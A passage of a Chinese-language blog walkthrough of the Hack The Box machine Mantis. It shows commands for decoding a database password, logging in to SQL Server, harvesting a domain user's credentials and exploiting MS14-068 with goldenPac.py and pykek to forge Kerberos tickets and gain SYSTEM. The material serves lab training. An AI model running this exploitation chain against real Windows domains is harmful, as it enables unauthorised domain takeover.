+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.42.56.png" alt="截屏2021-10-27 下午3.42.56"><br>密码为<code>@dm!n_P@ssW0rd!</code></p>
+<h4 id="SQLserver密码"><a href="#SQLserver密码" class="headerlink" title="SQLserver密码"></a>SQLserver密码</h4><p>将 txt 文件名中的密文进行 base64 解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.45.32.png" alt="截屏2021-10-27 下午3.45.32"><br>结果显示其中所有两位十六进制值似乎都属于ASCII码范围，因此尝试使用 xxd 来解码十六进制并查看对应的字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.48.43.png" alt="截屏2021-10-27 下午3.48.43"><br>密码为<code>m$$ql_S@_P@ssW0rd!</code></p>
+<h2 id="0x02-上线-james"><a href="#0x02-上线-james" class="headerlink" title="0x02 上线[james]"></a>0x02 上线[james]</h2><h3 id="SQLserver数据库登录"><a href="#SQLserver数据库登录" class="headerlink" title="SQLserver数据库登录"></a>SQLserver数据库登录</h3><p>使用 sa 和以上密码进行数据库登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/impacket/examples/mssqlclient.py . </span><br><span class="line">python3 mssqlclient.py <span class="string">&#x27;sa:m$$ql_S@_P@ssW0rd!@10.10.10.52&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.59.04.png" alt="截屏2021-10-27 下午3.59.04"><br>但是 sa 登录失败，切换 OrchardCMS 的管理员用户 admin 登陆成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 mssqlclient.py <span class="string">&#x27;admin:m$$ql_S@_P@ssW0rd!@10.10.10.52&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%883.59.20.png" alt="截屏2021-10-27 下午3.59.20"><br>由于通过命令行查看有点不方便，使用 dbeaver 进行查看<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.01.54.png" alt="截屏2021-10-27 下午4.01.54"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.02.27.png" alt="截屏2021-10-27 下午4.02.27"><br>点击测试后出现以下报错信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.12.58.png" alt="截屏2021-10-27 下午4.12.58"><br>我们需要修改 java.security 文件，通过 locate 定位该文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">locate java.security</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.17.35.png" alt="截屏2021-10-27 下午4.17.35"><br>在其中寻找 jdk.tls.disabledAlgorithms 并修改信息如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">jdk.tls.disabledAlgorithms=SSLv3,</span> <span class="string">RC4,</span> <span class="string">DES,</span> <span class="string">MD5withRSA,</span> <span class="string">\</span></span><br><span class="line">    <span class="string">DH</span> <span class="string">keySize</span> <span class="string">&lt;</span> <span class="number">1024</span><span class="string">,</span> <span class="string">EC</span> <span class="string">keySize</span> <span class="string">&lt;</span> <span class="number">224</span><span class="string">,</span> <span class="string">3DES_EDE_CBC,</span> <span class="string">anon,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">\</span></span><br><span class="line">    <span class="string">include</span> <span class="string">jdk.disabled.namedCurves</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.17.25.png" alt="截屏2021-10-27 下午4.17.25"><br>重新尝试后连接成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.25.26.png" alt="截屏2021-10-27 下午4.25.26"><br>在<code>orcharddb/Schemas/dbo/Tables/blog_Orchard_Users_UserPartRecord</code>下找到了可利用的账号密码为<code>James/J@m3s_P@ssW0rd!</code>，电子邮件为<code>james@htb.local</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.33.04.png" alt="截屏2021-10-27 下午4.33.04"></p>
+<h3 id="smb登陆"><a href="#smb登陆" class="headerlink" title="smb登陆"></a>smb登陆</h3><p>使用 crackmapexec 检测 smb 凭证是否有效</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.52 -u james -p <span class="string">&#x27;J@m3s_P@ssW0rd!&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.36.11.png" alt="截屏2021-10-27 下午4.36.11"><br>结果显示有效，使用 smbmap 查看 smb 共享</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.52 -u james -p <span class="string">&#x27;J@m3s_P@ssW0rd!&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.37.58.png" alt="截屏2021-10-27 下午4.37.58"><br>使用 rpcclient 进行连接并查看当前所有用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U htb.local/james 10.10.10.52</span><br><span class="line">rpc &gt; enumdomusers</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.39.50.png" alt="截屏2021-10-27 下午4.39.50"></p>
+<p>通过 james 身份查看 kerberos 信息，但是未返回信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 GetNPUsers.py <span class="string">&#x27;htb.local/james:J@m3s_P@ssW0rd!&#x27;</span> -dc-ip 10.10.10.52</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-27%20%E4%B8%8B%E5%8D%884.41.06.png" alt="截屏2021-10-27 下午4.41.06"></p>
+<h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="ms14-068自动提权"><a href="#ms14-068自动提权" class="headerlink" title="ms14-068自动提权"></a>ms14-068自动提权</h3><p>首先修改本地 hosts 文件完成域名解析，将 mantis.htb.local、htb.local 解析为10.10.10.52</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">vim</span> <span class="string">/etc/hosts</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.52</span> <span class="string">mantis.htb.local</span> <span class="string">mantis</span></span><br><span class="line"><span class="number">10.10</span><span class="number">.10</span><span class="number">.52</span> <span class="string">htb.local</span></span><br></pre></td></tr></table></figure>
+<p>使用 impacket 中的 goldenPac.py 可直接获取系统权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.52.07.png" alt="截屏2021-10-28 上午9.52.07"><br>在用户 james 和管理员桌面上寻找flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\james\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\james\Desktop\user.txt</span><br><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.56.32.png" alt="截屏2021-10-28 上午9.56.32"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%889.57.43.png" alt="截屏2021-10-28 上午9.57.43"><br>成功获取两个flag</p>
+<h3 id="ms14-068手动提权"><a href="#ms14-068手动提权" class="headerlink" title="ms14-068手动提权"></a>ms14-068手动提权</h3><p>通过 Python Kerberos 漏洞利用工具包 (ms14-068.py）可以允许普通用户在没有管理员身份的情况下获得黄金票，从而可以获取域管理员权限。<br><strong>参考文章：<a target="_blank" rel="noopener" href="https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html">https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html</a></strong><br>首先安装 kerberos 软件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install krb5-user cifs-utils rdate</span><br></pre></td></tr></table></figure>
+<p>修改DNS配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/resolv.conf</span><br><span class="line"><span class="comment">##配置</span></span><br><span class="line">nameserver 10.10.10.52</span><br></pre></td></tr></table></figure>
+<p>修改 kerberos 域的相关信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/krb5.conf</span><br><span class="line"><span class="comment">##配置</span></span><br><span class="line">[libdefaults]</span><br><span class="line">	default_realm = HTB.LOCAL</span><br><span class="line"></span><br><span class="line"><span class="comment"># The following krb5.conf variables are only for MIT Kerberos.</span></span><br><span class="line">	kdc_timesync = 1</span><br><span class="line">	ccache_type = 4</span><br><span class="line">	forwardable = <span class="literal">true</span></span><br><span class="line">	proxiable = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">    HTB.LOCAL = &#123;</span><br><span class="line">	   kdc = mantis.htb.local:88</span><br><span class="line">	   admin_server = mantis.htb.local</span><br><span class="line">	   default_domain = HTB.LOCAL </span><br><span class="line">	&#125;</span><br><span class="line">[domain_realm]</span><br><span class="line">	.domain.internal = HTB.LOCAL</span><br><span class="line">	domain.internal = HTB.LOCAL</span><br></pre></td></tr></table></figure>
+
+<p>让DC同步我们时间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdate -n 10.10.10.52</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.35.23.png" alt="截屏2021-10-28 上午10.35.23"></p>
+<p>通过 kinit 生成票据，但是使用小写域名好像有问题，需要改成大写，否则会出现以下报错</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kinit -V james@htb.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.06.07.png" alt="截屏2021-10-28 上午10.06.07"><br>将域名大写后票据生成成功，接下来需要将其锻造成黄金票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kinit -V james@HTB.LOCAL</span><br><span class="line">klist</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.38.20.png" alt="截屏2021-10-28 上午10.38.20"><br>使用 rpcclient 获取 USER_SID</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcclient -U james 10.10.10.52</span><br><span class="line">rpc &gt; lookupnames james</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.02.34.png" alt="截屏2021-10-28 上午10.02.34"></p>
+<p>使用 github 上的工具 pykek 来生成黄金票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mubix/pykek &amp;&amp; <span class="built_in">cd</span> pykek</span><br><span class="line">python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.46.48.png" alt="截屏2021-10-28 上午10.46.48"><br>成功生成后将其复制到票据使用位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp TGT_james@htb.local.ccache /tmp/krb5cc_0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8810.48.21.png" alt="截屏2021-10-28 上午10.48.21"></p>
+<p>通过 smb 服务可直接下载并查看其中的root.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -k -U james \\\\mantis.htb.local\\C$</span><br><span class="line">smb &gt; get Users\administrator\desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.15.51.png" alt="截屏2021-10-28 上午11.15.51"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.16.39.png" alt="截屏2021-10-28 上午11.16.39"></p>
+<p>最后使用 psexec.py 可上线shell，但是有点问题。还是使用之前的脚本上线吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py htb.local/james:J@m3s_P@ssW0rd\!@mantis.htb.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/7e81c547/%E6%88%AA%E5%B1%8F2021-10-28%20%E4%B8%8A%E5%8D%8811.12.09.png" alt="截屏2021-10-28 上午11.12.09"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/61576a4b/">HTB: Active<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
